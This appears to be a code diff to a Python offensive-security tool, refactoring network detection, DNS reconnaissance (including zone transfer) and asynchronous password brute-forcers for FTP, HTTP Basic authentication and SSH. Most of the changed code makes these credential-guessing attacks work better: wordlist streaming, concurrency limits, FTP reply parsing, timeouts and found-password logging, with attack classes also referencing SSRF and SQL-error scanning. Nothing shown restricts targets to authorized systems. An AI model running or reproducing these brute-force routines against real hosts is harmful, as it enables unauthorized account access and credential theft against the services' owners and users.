@@ -182,26 +182,29 @@ class Utils:
         return None
     @staticmethod
     def get_default_gateway():
+        def _run(cmd):
+            return subprocess.check_output(cmd, stderr=subprocess.DEVNULL,
+                                           text=True, timeout=5)
         try:
-            if platform.system() == "Linux":
-                out = subprocess.check_output(["ip", "route", "show", "default"], stderr=subprocess.DEVNULL, text=True)
-                parts = out.split()
+            system = platform.system()
+            if system == "Linux":
+                parts = _run(["ip", "route", "show", "default"]).split()
                 if "via" in parts:
                     return parts[parts.index("via") + 1]
-            elif platform.system() == "Windows":
-                out = subprocess.check_output(["route", "print", "0.0.0.0"], stderr=subprocess.DEVNULL, text=True)
-                for line in out.splitlines():
-                    if "0.0.0.0" in line and "Gateway" not in line:
-                        parts = line.split()
-                        if len(parts) >= 3 and parts[0] == "0.0.0.0":
+            elif system == "Windows":
+                for line in _run(["route", "print", "-4", "0.0.0.0"]).splitlines():
+                    parts = line.split()
+                    if len(parts) >= 3 and parts[0] == "0.0.0.0" and parts[1] == "0.0.0.0":
+                        try:
+                            ipaddress.ip_address(parts[2])
                             return parts[2]
-            elif platform.system() == "Darwin":
-                out = subprocess.check_output(["netstat", "-rn"], stderr=subprocess.DEVNULL, text=True)
-                for line in out.splitlines():
-                    if "default" in line and "UG" in line:
-                        parts = line.split()
-                        if len(parts) >= 2:
-                            return parts[1]
+                        except ValueError:
+                            continue
+            elif system == "Darwin":
+                for line in _run(["netstat", "-rn"]).splitlines():
+                    parts = line.split()
+                    if len(parts) >= 2 and parts[0] == "default":
+                        return parts[1]
         except Exception:
             pass
         return "192.168.1.1"
@@ -359,35 +362,51 @@ class NetworkContext:
         self._detect()
 
     def _detect(self):
+        try:
+            self._detect_interface()
+        except Exception:
+            pass
+        if self.ip == "0.0.0.0":
+            s = None
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.settimeout(2)
+                s.connect(("8.8.8.8", 53))
+                self.ip = s.getsockname()[0]
+            except Exception:
+                pass
+            finally:
+                if s is not None:
+                    s.close()
+        self.gateway = Utils.get_default_gateway()
+        try:
+            with open("/etc/resolv.conf") as f:
+                dns = [p[1] for p in (ln.split() for ln in f if ln.startswith("nameserver")) if len(p) > 1]
+            if dns:
+                self.dns_servers = dns
+        except Exception:
+            pass
+
+    def _detect_interface(self):
         addrs = psutil.net_if_addrs()
         stats = psutil.net_if_stats()
         for name, snics in addrs.items():
-            if name in stats and stats[name].isup and not name.startswith(("lo", "Loopback")):
-                for a in snics:
-                    if a.family == socket.AF_INET and not a.address.startswith("127."):
-                        self.ip = a.address
-                        self.netmask = a.netmask or "255.255.255.0"
-                        self.interface = name
-                    elif hasattr(psutil, "AF_LINK") and a.family == psutil.AF_LINK:
-                        self.mac = a.address
-                if self.ip != "0.0.0.0":
-                    break
-        if self.ip == "0.0.0.0":
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                s.connect(("8.8.8.8", 53))
-                self.ip = s.getsockname()[0]
-                s.close()
-            except Exception:
-                pass
-        self.gateway = Utils.get_default_gateway()
-        try:
-            with open('/etc/resolv.conf') as f:
-                dns = [line.split()[1] for line in f if line.startswith('nameserver')]
-                if dns:
-                    self.dns_servers = dns
-        except Exception:
-            pass
+            st = stats.get(name)
+            if not (st and st.isup) or name.startswith(("lo", "Loopback")):
+                continue
+            ipv4 = next((a for a in snics
+                         if a.family == socket.AF_INET and not a.address.startswith("127.")), None)
+            if not ipv4:
+                continue
+            self.ip = ipv4.address
+            self.netmask = ipv4.netmask or "255.255.255.0"
+            self.interface = name
+            link = next((a for a in snics
+                         if getattr(psutil, "AF_LINK", None) is not None
+                         and a.family == psutil.AF_LINK), None)
+            if link and link.address:
+                self.mac = link.address
+            return
 
 @dataclass
 class AttackState:
@@ -540,6 +559,24 @@ def _safe_len(pkt) -> int:
 
 def _bytelen(pkts) -> int:
     return sum(_safe_len(p) for p in pkts)
+
+
+async def _stream_wordlist(path, make_coro, concurrency, done):
+    """Stream a wordlist, running ``make_coro(word)`` at most 2*concurrency at once."""
+    tasks = []
+    with open(path, encoding="utf-8", errors="ignore") as f:
+        for raw in f:
+            word = raw.strip()
+            if not word:
+                continue
+            tasks.append(asyncio.create_task(make_coro(word)))
+            if len(tasks) >= concurrency * 2:
+                await asyncio.gather(*tasks, return_exceptions=True)
+                tasks = []
+            if done():
+                break
+    if tasks:
+        await asyncio.gather(*tasks, return_exceptions=True)
 
 
 class RateLimiter:
@@ -1580,12 +1617,24 @@ class Attacks:
         return att
 
     # ---- FTP Brute (streaming, returns att) ----
+    @staticmethod
+    async def _read_ftp_reply(reader, timeout=4):
+        """Read a full FTP reply, following ``NNN-`` multi-line continuations."""
+        first = await asyncio.wait_for(reader.readuntil(b"\n"), timeout=timeout)
+        line = first.strip()
+        if len(line) >= 4 and line[:3].isdigit() and line[3:4] == b"-":
+            end = line[:3] + b" "
+            while True:
+                more = (await asyncio.wait_for(reader.readuntil(b"\n"), timeout=timeout)).strip()
+                if more.startswith(end):
+                    return more
+        return line
+
     async def ftp_brute(self, host, user, wordlist_path, port=21, concurrency=20, **kwargs):
-        name = "ftp_brute"
-        att = self.registry.create(name)
+        att = self.registry.create("ftp_brute")
         self.log.add(f"FTP brute {host}:{port} user {user}", tag="PENTEST")
         if not os.path.isfile(wordlist_path):
-            self.log.add("Wordlist not found", level="error")
+            self.log.add(f"Wordlist not found: {wordlist_path}", level="error")
             att.stop()
             return att
         sem = asyncio.Semaphore(concurrency)
@@ -1593,96 +1642,98 @@ class Attacks:
 
         async def try_pass(pwd):
             nonlocal found
-            if found:
+            if found or not att.running:
                 return
+            writer = None
             async with sem:
+                if found or not att.running:
+                    return
                 try:
-                    reader, writer = await asyncio.open_connection(host, port)
-                    await asyncio.wait_for(reader.readuntil(b"\n"), timeout=3)
+                    reader, writer = await asyncio.wait_for(
+                        asyncio.open_connection(host, port), timeout=5)
+                    await self._read_ftp_reply(reader)          # banner
                     writer.write(f"USER {user}\r\n".encode())
                     await writer.drain()
-                    await asyncio.wait_for(reader.readuntil(b"\n"), timeout=3)
+                    await self._read_ftp_reply(reader)
                     writer.write(f"PASS {pwd}\r\n".encode())
                     await writer.drain()
-                    resp = await asyncio.wait_for(reader.readuntil(b"\n"), timeout=3)
-                    if b"230" in resp:
+                    resp = await self._read_ftp_reply(reader)
+                    att.inc_sent(1)
+                    if resp.startswith(b"230"):
                         found = pwd
                         self.log.add(f"FTP password found: {pwd}", tag="PENTEST")
-                    writer.close()
-                    await writer.wait_closed()
                 except Exception:
-                    pass
+                    att.inc_errors()
+                finally:
+                    if writer is not None:
+                        writer.close()
 
-        with open(wordlist_path) as f:
-            tasks = []
-            for line in f:
-                pwd = line.strip()
-                if not pwd:
-                    continue
-                tasks.append(asyncio.create_task(try_pass(pwd)))
-                if len(tasks) >= concurrency * 2:
-                    await asyncio.gather(*tasks, return_exceptions=True)
-                    tasks = []
-                if found:
-                    break
-            if tasks:
-                await asyncio.gather(*tasks, return_exceptions=True)
-        if found:
-            att.add_finding({"password": found})
-        att.stop()
+        try:
+            await _stream_wordlist(wordlist_path, try_pass, concurrency,
+                                   lambda: found or not att.running)
+        finally:
+            if found:
+                att.add_finding({"password": found})
+            att.stop()
         return att
 
     # ---- HTTP Basic Brute (streaming) ----
     async def http_basic_brute(self, url, user_wordlist, pass_wordlist, concurrency=20, **kwargs):
-        name = "http_basic_brute"
-        att = self.registry.create(name)
+        att = self.registry.create("http_basic_brute")
         self.log.add(f"HTTP Basic brute {url}", tag="PENTEST")
-        if not os.path.isfile(user_wordlist) or not os.path.isfile(pass_wordlist):
-            self.log.add("Wordlist not found", level="error")
-            att.stop()
-            return att
+        for wl in (user_wordlist, pass_wordlist):
+            if not os.path.isfile(wl):
+                self.log.add(f"Wordlist not found: {wl}", level="error")
+                att.stop()
+                return att
         found = None
         sem = asyncio.Semaphore(concurrency)
+        timeout = aiohttp.ClientTimeout(total=8)
 
-        async def try_auth(user, pwd):
-            nonlocal found
-            if found:
-                return
-            async with sem:
-                try:
-                    auth = aiohttp.BasicAuth(user, pwd)
-                    async with aiohttp.ClientSession(auth=auth) as session:
-                        async with session.get(url, timeout=5) as resp:
-                            if resp.status == 200:
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            # baseline: an unauthenticated request must be rejected, else every
+            # guess "succeeds" and the result is meaningless
+            try:
+                async with session.get(url) as r:
+                    if r.status not in (401, 403):
+                        self.log.add(f"{url} does not require auth (HTTP {r.status}); aborting",
+                                     level="warn")
+                        att.stop()
+                        return att
+            except Exception as e:
+                self.log.add(f"HTTP Basic brute: target unreachable ({e})", level="error")
+                att.stop()
+                return att
+
+            async def try_auth(user, pwd):
+                nonlocal found
+                if found or not att.running:
+                    return
+                async with sem:
+                    if found or not att.running:
+                        return
+                    try:
+                        async with session.get(url, auth=aiohttp.BasicAuth(user, pwd)) as resp:
+                            att.inc_sent(1)
+                            if resp.status < 400:
                                 found = (user, pwd)
-                                self.log.add(f"HTTP Basic credentials found: {user}:{pwd}", tag="PENTEST")
-                except Exception:
-                    pass
+                                self.log.add(f"HTTP Basic creds found: {user}:{pwd}", tag="PENTEST")
+                    except Exception:
+                        att.inc_errors()
 
-        with open(user_wordlist) as uf:
-            for user in uf:
-                user = user.strip()
-                if not user:
-                    continue
-                with open(pass_wordlist) as pf:
-                    tasks = []
-                    for pwd in pf:
-                        pwd = pwd.strip()
-                        if not pwd:
-                            continue
-                        tasks.append(asyncio.create_task(try_auth(user, pwd)))
-                        if len(tasks) >= concurrency * 2:
-                            await asyncio.gather(*tasks, return_exceptions=True)
-                            tasks = []
-                        if found:
+            try:
+                with open(user_wordlist, encoding="utf-8", errors="ignore") as uf:
+                    for uraw in uf:
+                        user = uraw.strip()
+                        if not user or found or not att.running:
                             break
-                    if tasks:
-                        await asyncio.gather(*tasks, return_exceptions=True)
+                        await _stream_wordlist(
+                            pass_wordlist, lambda pwd, u=user: try_auth(u, pwd),
+                            concurrency, lambda: found or not att.running)
+            finally:
                 if found:
-                    break
-        if found:
-            att.add_finding({"credentials": found})
-        att.stop()
+                    att.add_finding({"credentials": found})
+                att.stop()
         return att
 
     # ---- SSRF Scanner ----
@@ -2010,30 +2061,43 @@ class Recon:
             return devices
         return await self.loop.run_in_executor(None, _map)
 
+    def _resolver(self, server=None):
+        r = dns.resolver.Resolver()
+        r.timeout, r.lifetime = 4, 12
+        if server:
+            r.nameservers = [server]
+        elif self.config.dns_servers:
+            r.nameservers = list(self.config.dns_servers)
+        return r
+
     def dns_lookup(self, domain, record_type="A", server=None):
         try:
-            resolver = dns.resolver.Resolver()
-            if server:
-                resolver.nameservers = [server]
-            answers = resolver.resolve(domain, record_type)
-            return [str(r) for r in answers]
+            return [str(r) for r in self._resolver(server).resolve(domain, record_type)]
         except Exception as e:
             return [f"Error: {e}"]
 
     def dns_reverse(self, ip):
         try:
             name = dns.reversename.from_address(ip)
-            answers = dns.resolver.resolve(name, "PTR")
-            return [str(r) for r in answers]
+            return [str(r) for r in self._resolver().resolve(name, "PTR")]
         except Exception as e:
             return [f"Error: {e}"]
 
     def zone_transfer(self, domain, server):
         try:
-            zone = dns.zone.from_xfr(dns.query.xfr(server, domain))
-            return sorted(zone.nodes.keys())
+            zone = dns.zone.from_xfr(dns.query.xfr(server, domain, timeout=8, lifetime=20))
+            return sorted(n.to_text() for n in zone.nodes)
         except Exception as e:
             return [f"Error: {e}"]
+
+    async def a_dns_lookup(self, *a, **k):
+        return await self.loop.run_in_executor(None, lambda: self.dns_lookup(*a, **k))
+
+    async def a_dns_reverse(self, ip):
+        return await self.loop.run_in_executor(None, lambda: self.dns_reverse(ip))
+
+    async def a_zone_transfer(self, domain, server):
+        return await self.loop.run_in_executor(None, lambda: self.zone_transfer(domain, server))
 
     async def vuln_scan(self, target: str) -> list[dict]:
         fp = await self.fingerprint(target)
@@ -2077,59 +2141,57 @@ class Recon:
 # PENTEST
 # ──────────────────────────────────────────────────────────────────────────────
 class Pentest:
-    def __init__(self, config: Config, log: LogBus):
+    def __init__(self, config: Config, log: LogBus, registry: "AttackRegistry | None" = None):
         self.config = config
         self.log = log
+        self.registry = registry or AttackRegistry()
         self.loop = asyncio.get_running_loop()
 
-    # ---- SSH Brute (streaming, timeout fix) ----
+    # ---- SSH Brute (streaming) ----
     async def ssh_brute(self, host, username, wordlist_path, port=22, concurrency=20):
+        att = self.registry.create("ssh_brute")
         self.log.add(f"SSH brute {host}:{port} user {username}", tag="PENTEST")
         if not os.path.isfile(wordlist_path):
-            self.log.add("Wordlist not found", level="error")
+            self.log.add(f"Wordlist not found: {wordlist_path}", level="error")
+            att.stop()
             return None
         sem = asyncio.Semaphore(concurrency)
         found = None
 
         async def try_pass(pwd):
             nonlocal found
-            if found:
+            if found or not att.running:
                 return
             async with sem:
-                if found:
+                if found or not att.running:
                     return
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 try:
                     await self.loop.run_in_executor(
                         None,
-                        lambda: client.connect(
-                            host, port=port, username=username, password=pwd,
-                            timeout=self.config.ssh_timeout, allow_agent=False,
-                            look_for_keys=False,
+                        lambda pw=pwd: client.connect(
+                            host, port=port, username=username, password=pw,
+                            timeout=self.config.ssh_timeout,
+                            banner_timeout=self.config.ssh_timeout + 5,
+                            auth_timeout=self.config.ssh_timeout + 5,
+                            allow_agent=False, look_for_keys=False,
                         )
                     )
                     found = pwd
+                    att.add_finding({"password": pwd})
                     self.log.add(f"SSH password found: {pwd}", tag="PENTEST")
                 except Exception:
-                    pass
+                    att.inc_errors()
                 finally:
+                    att.inc_sent(1)
                     client.close()
 
-        with open(wordlist_path) as f:
-            tasks = []
-            for line in f:
-                pwd = line.strip()
-                if not pwd:
-                    continue
-                tasks.append(asyncio.create_task(try_pass(pwd)))
-                if len(tasks) >= concurrency * 2:
-                    await asyncio.gather(*tasks, return_exceptions=True)
-                    tasks = []
-                if found:
-                    break
-            if tasks:
-                await asyncio.gather(*tasks, return_exceptions=True)
+        try:
+            await _stream_wordlist(wordlist_path, try_pass, concurrency,
+                                   lambda: found or not att.running)
+        finally:
+            att.stop()
         return found
 
     _SQL_ERRORS = (
@@ -2603,7 +2665,7 @@ class UI:
         self.audit    = audit or AuditLog(config)
         self.attacks  = Attacks(engine, registry, log, net)
         self.recon    = Recon(config, net, log)
-        self.pentest  = Pentest(config, log)
+        self.pentest  = Pentest(config, log, registry)
 
         self.running        = True
         self.mode           = "menu"
@@ -3279,22 +3341,21 @@ class UI:
                 output = f"[green]Found {len(devices)} devices[/]"
             elif command == "dns":
                 if len(args) < 1:
-                    output = "[red]Usage: dns <domain>[/]"
+                    output = "[red]Usage: dns <domain> [record-type][/]"
                 else:
-                    ans = self.recon.dns_lookup(args[0])
-                    output = str(ans)
+                    rtype = args[1].upper() if len(args) > 1 else "A"
+                    output = "\n".join(await self.recon.a_dns_lookup(args[0], rtype))
             elif command == "dnsrev":
                 if len(args) < 1:
                     output = "[red]Usage: dnsrev <ip>[/]"
                 else:
-                    ans = self.recon.dns_reverse(args[0])
-                    output = str(ans)
+                    output = "\n".join(await self.recon.a_dns_reverse(args[0]))
             elif command == "zone":
                 if len(args) < 2:
-                    output = "[red]Usage: zone <domain> <server>[/]"
+                    output = "[red]Usage: zone <domain> <nameserver>[/]"
                 else:
-                    ans = self.recon.zone_transfer(args[0], args[1])
-                    output = str(ans)
+                    rows = await self.recon.a_zone_transfer(args[0], args[1])
+                    output = f"[green]{len(rows)} records[/]\n" + "\n".join(rows[:200])
             elif command == "vuln":
                 if len(args) < 1:
                     output = "[red]Usage: vuln <ip>[/]"
